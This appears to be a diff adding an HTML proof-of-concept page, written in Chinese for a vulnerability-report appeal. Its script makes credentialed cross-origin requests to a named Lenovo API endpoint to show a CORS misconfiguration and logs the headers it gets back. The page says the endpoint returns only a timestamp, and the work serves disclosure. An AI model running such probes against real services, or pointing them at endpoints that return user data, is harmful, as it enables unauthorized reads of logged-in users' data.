@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta charset="utf-8"><title>papi CORS 申诉版复现（配置缺陷口径·须部署外网HTTPS域名 + 登录后运行）</title></head>
+<body>
+<pre id="out">运行中… 请确认：①本文件已部署到外网HTTPS域名(非file://非localhost) ②已用本人Lenovo ID登录 ③浏览器访问该外网链接运行</pre>
+<script>
+// papi 申诉版复现（对齐本项目 T4_配置暴露.md §8.5 合规口径：配置缺陷，不伪造用户字段）
+//  - 须从【外网独立HTTPS域名】打开（Origin=该域名，非null/非localhost），满足豆包缺口2
+//  - OPTIONS 与 GET 对同一 URL、同源同 Origin 成对，满足豆包缺口4
+//  - GET 带 credentials:include（证据见 DevTools Network 的 Cookie 请求头），满足豆包缺口3
+//  - 端点仅用已确证 CORS 反射的 /cache/time（来自 24 报告实测 + T4 §8.2 陷阱③校过状态码）
+// 说明：papi 是 API 域。本页只证明"任意外源可带登录态凭证跨域请求 papi"，属 CWE-942 配置缺陷；
+//       不伪造任何用户字段（/cache/time 仅返回时间戳，无用户数据，按 T4 §8.5 不得夸大）。
+const TARGET = 'https://papi.lenovo.com.cn/cache/time';
+async function probe(url){
+  let s = '=== ' + url + ' ===\n';
+  try{
+    const o = await fetch(url, {method:'OPTIONS', credentials:'include'});
+    s += '[OPTIONS] status=' + o.status + ' type=' + o.type + '\n';
+    s += '  ACAO=' + o.headers.get('access-control-allow-origin') + '\n';
+    s += '  ACAC=' + o.headers.get('access-control-allow-credentials') + '\n';
+    s += '  ACAM=' + o.headers.get('access-control-allow-methods') + '\n';
+    s += '  ACAR=' + o.headers.get('access-control-allow-headers') + '\n';
+  }catch(e){ s += '[OPTIONS] 被拦截: ' + e + '\n'; }
+  try{
+    const r = await fetch(url, {credentials:'include'});
+    const body = await r.text();
+    s += '[GET] status=' + r.status + ' type=' + r.type + '\n';
+    s += '  ACAO=' + r.headers.get('access-control-allow-origin') + '\n';
+    s += '  ACAC=' + r.headers.get('access-control-allow-credentials') + '\n';
+    s += '  响应正文(证明跨域读取成功·本端点仅时间戳无用户字段，按T4§8.5不夸大):\n' + body + '\n';
+    s += '  ⚠️ 会话凭证证据: 请另截 DevTools Network 中本请求的 Cookie 请求头(随 credentials:include 自动附加)\n';
+  }catch(e){ s += '[GET] 被拦截: ' + e + '\n'; }
+  return s;
+}
+(async()=>{
+  let log = '⚠️ 运行前确认：本页源为外网HTTPS域名(Origin非null) + 你已用本人Lenovo ID登录\n\n';
+  log += await probe(TARGET) + '\n';
+  log += '【配置缺陷判定】本外域网页以 credentials:include 跨域请求 papi 成功(type=cors、无CORS报错)，\n';
+  log += '且请求自动携带登录态 Cookie（见 Network）→ 证明任意第三方站点可在已登录用户浏览器中带凭证跨域调用 papi（CWE-942）。\n';
+  log += '【多源反射(curl另行完成)】在命令行对 /cache/time 发 3 个不同 Origin，均应原样回显 ACAO + ACAC:true。\n';
+  document.getElementById('out').textContent = log;
+  console.log(log);
+})();
+</script>
+</body>
+</html>
